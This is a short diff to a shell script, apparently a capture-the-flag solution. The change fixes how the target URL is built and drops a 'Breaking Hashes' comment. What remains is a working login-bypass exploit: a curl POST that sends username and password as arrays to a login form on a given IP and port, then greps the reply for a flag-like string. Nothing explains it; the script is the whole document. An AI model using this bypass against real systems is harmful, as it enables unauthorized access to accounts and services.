@@ -16,9 +16,7 @@ then
     echo $0" <ip> <port>"
     exit 1
 else
-    URL=$1':'$2
+    URL='http://'$1':'$2
 fi
-
-# Breaking Hashes
 
 curl "$URL" -s -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username[]="8"&password[]=8&submit=Login' | grep SSS
